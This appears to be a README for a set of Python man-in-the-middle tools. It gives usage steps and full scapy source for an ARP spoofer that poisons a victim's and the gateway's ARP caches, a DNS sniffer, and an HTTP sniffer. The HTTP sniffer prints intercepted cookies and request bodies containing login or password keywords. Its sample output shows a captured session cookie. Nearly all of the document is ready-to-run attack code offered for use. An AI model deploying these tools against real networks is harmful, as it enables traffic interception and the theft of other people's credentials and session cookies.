
## Usage

1. First of all, we need to enable traffic forwarding, to allow the victim 
```bash
$: sudo iptables --policy FORWARD ACCEPT
$: echo "1" > /proc/sys/net/ipv4/ip_forward
```
- to return normal, just `sudo iptables --flush`

2. Then run the arp_spoofer.py, that will be running infinitely (untill you press Ctrl+C)
```python
$: sudo python3 arp_spoofer.py -t 192.168.1.131 -m 08:00:27:ab:c1:42
[*] Envenenando la IP 192.168.1.131...
```
3. After that, we can start sniffing the traffic, either on wireshark or on the sniffers provided down below.
```bash
$: sudo python3 dns_sniffer.py -i eth0
[*] Dominio: i.ytimg.com.
[*] Dominio: g.whatsapp.net.

$: sudo python3 http_sniffer.py -i eth0
[*] URL: http//www.columbia.edu/cu/computinghistory/
	> User Agent Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36
	> Cookie: BIGipServer~CUIT~www.columbia.edu-80-pool=!I7DrZlVN/rWILg2xkMB4dfad9xLUYHKUMCM+kTVgws7copqnI4XcLh5eUI9RlrQikCLg2kIek28exiI=
```

------------------------------------------

## arp_spoofer.py

```python
#! usr/bin/env/python3
import socket, argparse, threading, sys, time, signal, re, subprocess
from termcolor import colored as color
import scapy.all as scapy

def def_handler(sig, frame):
    print(color("[!] Saliendo...", "yellow")); sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description='ARP spoofer')
    parser.add_argument("-t", "--target", dest="ip_addr", help="IP adress to spoof")
    parser.add_argument("-m", "--mac", dest="our_mac", help="attacker's mac adress")
    options = parser.parse_args() 
    if options.ip_addr is None or options.our_mac is None: 
        parser.print_help(); sys.exit(1)     
    return options.ip_addr, options.our_mac

spoof_ip = lambda ip_addr, ip_spoof, mac: scapy.send(scapy.ARP(op=2, psrc=ip_spoof, pdst=ip_addr, hwsrc=mac), verbose=0)
ip_addr, our_mac = get_arguments(); print(color(f"[*] Envenenando la IP {ip_addr}...", 'yellow'))
while True:
    spoof_ip(ip_addr, "192.168.1.1", our_mac); spoof_ip("192.168.1.1", ip_addr,  our_mac); time.sleep(2)
```
--------------------------------

## dns_sniffer.py

```python
#! usr/bin/env/python3
import scapy.all as scapy
from scapy.layers import http
from termcolor import colored as color
import sys, signal, argparse 

def def_handler(sig, frame):
    print(color("[!] Saliendo...", "yellow")); sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description='DNS sniffer')
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to listen in")
    options = parser.parse_args()
    if options.interface is None:
        parser.print_help(); sys.exit(1)
    return options.interface

def process_dns_packet(packet):
    if packet.haslayer(scapy.DNSQR):
        domain = packet[scapy.DNSQR].qname.decode()
        exclude = ["google", "cloudflare", "bing", "static"]
        if domain not in domains_seen and not any(keyword in domain for keyword in exclude):
            domains_seen.add(domain); print(color(f"[*] Dominio: {domain}", "yellow")) 

global domains_seen; domains_seen = set(); interface = get_arguments()
scapy.sniff(iface=interface, filter="port 53", prn = process_dns_packet, store=False)
```
-------------------

## http_sniffer.py

```python
#! usr/bin/env/python3
import scapy.all as scapy
from scapy.layers import http
from termcolor import colored as color
import signal, sys, argparse

def def_handler(sig, frame):
    print(color("\n[!] Saliendo...", "red")); sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description='DNS sniffer')
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to listen in")
    options = parser.parse_args()
    if options.interface is None:
        parser.print_help(); sys.exit(1)
    return options.interface

def process_http_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = "http//" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(color(f"\n[*] URL: {url}", "red"))
        print(color(f"\t> User Agent {packet[http.HTTPRequest].User_Agent.decode()}", "yellow"))
        try:
            print(color(f"\t> Cookie: {packet[http.HTTPRequest].Cookie.decode()}", "yellow"))
        except: 
            pass
        if packet.haslayer(scapy.Raw):
            try:
                response = packet[scapy.Raw].load.decode()
                for keyword in ["user", "pass", "mail", "login"]:
                    if keyword in response:
                        print(color(f"\t> Response: {response}", "yellow"))
                        break
            except:
                pass

interface = get_arguments(); scapy.sniff(iface=interface, prn = process_http_packet , store=False)
```